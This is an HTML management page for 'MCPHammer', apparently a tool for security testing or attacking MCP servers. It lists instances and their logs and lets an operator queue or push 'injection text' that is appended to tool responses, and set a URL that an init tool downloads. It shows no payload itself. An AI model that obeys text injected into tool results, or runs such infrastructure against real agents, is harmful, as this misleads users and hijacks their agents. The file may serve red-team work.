@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MCPHammer Management Console</title>
+    <link rel="stylesheet" href="/web/styles.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>MCPHammer Management Console</h1>
+            <div class="subtitle">Remote configuration and monitoring for MCPHammer instances</div>
+            <div class="status-bar">
+                <div class="status-item">
+                    <strong id="instance-count">0</strong> Active Instances
+                </div>
+                <div class="status-item">
+                    <strong id="queued-count">0</strong> Queued Updates
+                </div>
+                <div class="status-item">
+                    Last Refresh: <strong id="last-refresh">Never</strong>
+                </div>
+            </div>
+        </header>
+
+        <div class="main-content">
+            <div>
+                <div class="card">
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <h2>Registered Instances</h2>
+                        <button class="refresh-btn" onclick="loadInstances()">Refresh</button>
+                    </div>
+                    <div id="instances-container" class="instances-list">
+                        <div class="loading">
+                            <div class="spinner"></div>
+                            Loading instances...
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div>
+                <div class="card">
+                    <h2>Update Injection Text</h2>
+                    <div id="alert-container"></div>
+                    
+                    <form id="update-form">
+                        <div class="form-group">
+                            <label for="injection-text">Injection Text</label>
+                            <textarea 
+                                id="injection-text" 
+                                rows="4" 
+                                placeholder="Enter the injection text to append to tool responses..."
+                                required
+                            ></textarea>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Target Instances</label>
+                            <div class="instance-selector" id="instance-selector">
+                                <div class="loading">
+                                    <div class="spinner"></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="submit" class="btn btn-primary">
+                            Queue Update
+                        </button>
+                        <button type="button" class="btn btn-secondary" onclick="handlePushUpdate()">
+                            Push Immediately (if reachable)
+                        </button>
+                    </form>
+                </div>
+
+                <div class="card">
+                    <h2>Update Init Download URL</h2>
+                    <div id="url-alert-container"></div>
+                    
+                    <form id="url-update-form" onsubmit="return false;">
+                        <div class="form-group">
+                            <label for="init-url">Download URL for Init Tool</label>
+                            <input 
+                                type="text" 
+                                id="init-url" 
+                                placeholder="https://example.com/file.txt"
+                                style="width: 100%; padding: 10px; border: 1px solid var(--border-color); border-radius: 4px; background: var(--bg-dark); color: var(--text-color);"
+                            >
+                            <small style="color: var(--text-muted); display: block; margin-top: 5px;">
+                                This URL will be downloaded when the init tool is called
+                            </small>
+                        </div>
+
+                        <div class="form-group">
+                            <label>Target Instances</label>
+                            <div class="instance-selector" id="url-instance-selector">
+                                <div class="loading">
+                                    <div class="spinner"></div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <button type="button" class="btn btn-primary" onclick="handleUrlUpdate()">
+                            Queue URL Update
+                        </button>
+                        <button type="button" class="btn btn-secondary" onclick="handlePushUrlUpdate()">
+                            Push Immediately (if reachable)
+                        </button>
+                    </form>
+                </div>
+
+                <div class="card queued-updates">
+                    <h2>Queued Updates</h2>
+                    <div id="queued-updates-container">
+                        <div class="loading">
+                            <div class="spinner"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Logs Viewer Modal -->
+    <div id="logs-modal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h2 id="logs-modal-title">Instance Logs</h2>
+                <button class="modal-close" onclick="closeLogsModal()">&times;</button>
+            </div>
+            <div class="modal-tabs">
+                <button class="tab-btn active" onclick="switchTab('current')" data-tab="current">
+                    Current Session
+                </button>
+                <button class="tab-btn" onclick="switchTab('history')" data-tab="history">
+                    Session History
+                </button>
+            </div>
+            <div class="modal-body">
+                <div id="current-logs-tab" class="tab-content active">
+                    <div id="current-logs-container" class="logs-container">
+                        <div class="loading">
+                            <div class="spinner"></div>
+                            Loading logs...
+                        </div>
+                    </div>
+                </div>
+                <div id="history-logs-tab" class="tab-content">
+                    <div id="history-logs-container" class="logs-container">
+                        <div class="loading">
+                            <div class="spinner"></div>
+                            Loading session history...
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="/web/app.js"></script>
+</body>
+</html>
